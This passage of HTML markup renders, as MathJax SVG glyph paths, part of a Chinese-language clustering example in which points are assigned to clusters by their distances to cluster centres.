data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(18002,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(18668.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(19724.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.375ex" role="img" focusable="false" viewBox="0 -442 1008.6 607.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></g></svg></mjx-container>分到类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="4.011ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 1772.7 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>。</p><p>对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="46.888ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 20724.6 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5158.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5603,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6123,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(6512,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(7520.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(7965.2,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(9829.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10496.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(11552.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(1000,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(1278,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1778,0)"></path></g><g data-mml-node="mo" transform="translate(13830.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(14275.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(14795.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(15184.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(16192.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(16637.3,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(18502,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(19168.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(20224.6,0)"><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"></path></g></g></g></svg></mjx-container>，将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.339ex" role="img" focusable="false" viewBox="0 -442 1008.6 592"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" 